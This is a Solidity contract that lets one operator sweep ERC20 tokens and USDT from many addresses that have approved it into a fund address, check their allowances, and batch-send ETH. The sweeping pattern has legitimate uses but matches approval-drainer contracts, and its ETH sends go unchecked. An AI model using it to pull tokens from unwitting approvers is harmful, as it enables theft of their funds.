// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "Ownable.sol";

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface USDT {
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

contract CollectToken is Ownable{

    address public fundAddress;
    address public operator;
    address public usdtAddress;

    constructor(address _fundAddress, address _operator, address _usdtAddress){
        fundAddress = _fundAddress;
        operator = _operator;
        usdtAddress = _usdtAddress;
    }

    function setFundAddress(address _fundAddress) external onlyOwner {
        fundAddress = _fundAddress;
    }

    function setOperator(address _operator) external onlyOwner {
        operator = _operator;
    }

    function balanceOfs(address tokenAddress, address[] memory addressList) external view returns (uint256[] memory returnData) {
        returnData = new uint256[](addressList.length);
        IERC20 iERC20 = IERC20(tokenAddress);

        for(uint256 i = 0; i < addressList.length; i++) {
            returnData[i] = iERC20.balanceOf(addressList[i]);
        }
    }

    function allowances(address tokenAddress,  address[] memory addressList) external view returns (uint256[] memory returnData) {
        returnData = new uint256[](addressList.length);
        IERC20 iERC20 = IERC20(tokenAddress);

        for(uint256 i = 0; i < addressList.length; i++) {
            returnData[i] = iERC20.allowance(addressList[i], address(this));
        }
    }

    function collectionToken(address tokenAddress,  address[] memory addressList, uint256[] memory amountList) external {
        require(msg.sender == operator);

        IERC20 iERC20 = IERC20(tokenAddress);
        for(uint256 i = 0; i < addressList.length; i++) {
            iERC20.transferFrom(addressList[i], fundAddress, amountList[i]);
        }
    }

    function collectionUSDT(address[] memory addressList, uint256[] memory amountList) external {
        require(msg.sender == operator);

        USDT uSDT = USDT(usdtAddress);
        for(uint256 i = 0; i < addressList.length; i++) {
            uSDT.transferFrom(addressList[i], fundAddress, amountList[i]);
        }
    }

    function sendEth(address[] memory addressList, uint256 amount) external payable {
        require(msg.sender == operator);
        require(msg.value == addressList.length * amount);

        for(uint256 i = 0; i < addressList.length; i++) {
            payable(addressList[i]).send(amount);
        }
    }

}